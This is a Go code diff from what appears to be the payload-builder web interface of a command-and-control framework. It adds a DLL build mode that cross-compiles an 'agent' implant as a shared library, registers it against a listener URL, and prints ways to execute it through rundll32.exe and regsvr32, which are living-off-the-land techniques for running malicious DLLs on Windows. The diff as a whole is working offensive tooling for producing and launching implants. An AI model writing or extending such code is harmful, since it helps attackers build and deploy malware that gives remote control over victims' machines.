@@ -255,12 +255,37 @@ func (w *WebUI) buildAgentBinary(req PayloadRequest) PayloadResponse {
 	env = setEnvVar(env, "GOARCH", targetArch)
 	if buildMode == "dll" {
 		env = setEnvVar(env, "CGO_ENABLED", "1")
+		env = setEnvVar(env, "CC", "x86_64-w64-mingw32-gcc")
 	} else {
 		env = setEnvVar(env, "CGO_ENABLED", "0")
 	}
 
 	// Find project root
 	projectRoot := findRoot()
+
+	// DLL: c-shared buildmode targeting cmd/agent-dll
+	if buildMode == "dll" {
+		dllCmd := exec.Command("go", "build", "-buildmode=c-shared", "-ldflags", ldflags, "-o", outputPath, "./cmd/agent-dll")
+		dllCmd.Dir = projectRoot
+		dllCmd.Env = env
+		if out, err := dllCmd.CombinedOutput(); err != nil {
+			return PayloadResponse{Success: false, Message: fmt.Sprintf("DLL build failed: %s\n%s", err, strings.TrimSpace(string(out)))}
+		}
+		info, _ := os.Stat(outputPath)
+		size := "unknown"
+		if info != nil {
+			size = fmt.Sprintf("%.1f MB", float64(info.Size())/1024/1024)
+		}
+		AddPayloadRecord("dll", filepath.Base(outputPath), outputPath, size, req.ListenerURL)
+		return PayloadResponse{
+			Success:  true,
+			Message:  fmt.Sprintf("DLL built: %s (%s)\n\nExecution methods:\n  rundll32.exe %s,Start\n  regsvr32 /s /i %s\n  regsvr32 /s %s", outputPath, size, outputPath, outputPath, outputPath),
+			Filename: filepath.Base(outputPath),
+			FilePath: outputPath,
+			Size:     size,
+			Type:     "dll",
+		}
+	}
 
 	built := false
 
